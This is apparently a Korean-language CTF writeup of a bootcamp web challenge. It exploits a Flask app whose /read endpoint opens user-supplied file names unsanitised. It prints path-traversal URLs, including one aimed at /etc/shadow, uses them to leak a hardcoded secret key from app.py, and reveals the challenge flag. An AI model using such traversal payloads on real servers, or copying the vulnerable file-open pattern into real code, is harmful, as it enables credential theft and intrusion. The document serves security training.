---
title: "[Writeup] Knockon Bootcamp - 10. File Download"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Local file Inclusion
  - Path traversal
last_modified_at: 2024-09-15T20:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10009/>

![10. File Download 1](/assets/images/writeup/web-hacking/knock-on/10_FILE_1.png)

![10. File Download 2](/assets/images/writeup/web-hacking/knock-on/10_FILE_2.png)

|

|

|

### 목표

---

서버 파일에서 flag 찾기

|

### 공격 기법

---

Local file Inclusion

- Path traversal

|

|

|

## 문제 코드

```python
#!/usr/bin/env python3
import os
import subprocess
from flask import Flask, request, render_template

APP = Flask(__name__)
APP.secret_key = 'CENSORED'

@APP.route("/")
def index():
    files = os.listdir("uploads")
    return render_template("index.html", files=files)

@APP.route("/read")
def read_memo():
    error = False
    data = b""

    filename = request.args.get("name", "")

    try:
        with open(f"uploads/{filename}", "rb") as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True

    return render_template(
        "read.html",
        filename=filename,
        content=data.decode("utf-8"),
        error=error,
    )

@APP.route("/admin")
def admin():
    secret_key = request.args.get("key", "")
    if secret_key == APP.secret_key:
        try:
            result = subprocess.run(["./flag"], capture_output=True, text=True, check=True)
            msg = result.stdout
        except Exception as e:
            msg = f"Error.."
    else:
        msg = "You are not Admin"
    return render_template(
        "admin.html",
        msg=msg,
    )

if __name__ == "__main__":
    APP.run(host="0.0.0.0", port=8000)

```

|

|

|

## 코드 분석

```python
APP.secret_key = 'CENSORED'
```

`secret_key`가 하드코딩 되어있음

|

|

### read_memo()

---

```python
@APP.route("/read")
def read_memo():
    error = False
    data = b""

    filename = request.args.get("name", "")

    try:
        with open(f"uploads/{filename}", "rb") as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True

    return render_template(
        "read.html",
        filename=filename,
        content=data.decode("utf-8"),
        error=error,
    )
```

파일 이름을 name 파라미터를 통해 저장하고 있음. 이 부분에서 경로 조작 가능

|

|

### admin()

---

```python
@APP.route("/admin")
def admin():
    secret_key = request.args.get("key", "")
    if secret_key == APP.secret_key:
        try:
            result = subprocess.run(["./flag"], capture_output=True, text=True, check=True)
            msg = result.stdout
        except Exception as e:
            msg = f"Error.."
    else:
        msg = "You are not Admin"
    return render_template(
        "admin.html",
        msg=msg,
    )
```

`/admin?key=키`의 형식으로 올바른 키 값을 넘겨주면 `subprocess.run()`함수로 `./flag` 명령 실행 후 `msg`에 저장

이후 `msg`값을 랜더링

|

|

|

## Explot

### /read

---

```bash
http://war.knock-on.org:10009/admin?key=CENSORED
```

![10. File Download 3](/assets/images/writeup/web-hacking/knock-on/10_FILE_3.png)

소스코드에 있는 키를 그대로 넣으면 안됨

서버의 `app.py`파일에는 제대로된 키 값이 하드코딩 되어 있을 것임. 이걸 찾아야함

|

```bash
http://war.knock-on.org:10009/read?name=../../../../../../../../../etc/shadow
```

```bash
http://war.knock-on.org:10009/read?name=../uploads/diary.txt
```

`/read`에서 name 파라미터를 이용해 경로를 이동할 수 있음

![10. File Download 4](/assets/images/writeup/web-hacking/knock-on/10_FILE_4.png)

uploads와 같은 경로에 app.py가 존재함

|

```bash
http://war.knock-on.org:10009/read?name=../app.py
```

![10. File Download 5](/assets/images/writeup/web-hacking/knock-on/10_FILE_5.png)

하드코딩된 `secret_key` 발견

|

|

### /admin

---

```bash
http://war.knock-on.org:10009/admin?key=Wow_you_find_this?
```

![10. File Download 6](/assets/images/writeup/web-hacking/knock-on/10_FILE_6.png)

`/admin`에서 key 파라미터에 찾아낸 `secret_key`를 입력

|

|

|

## Payload

### URL

---

```bash
http://war.knock-on.org:10009/admin?key=Wow_you_find_this?
```

|

|

### FLAG

---

```bash
K0{H4rd_t0r_34_d_huh?}
```

|

---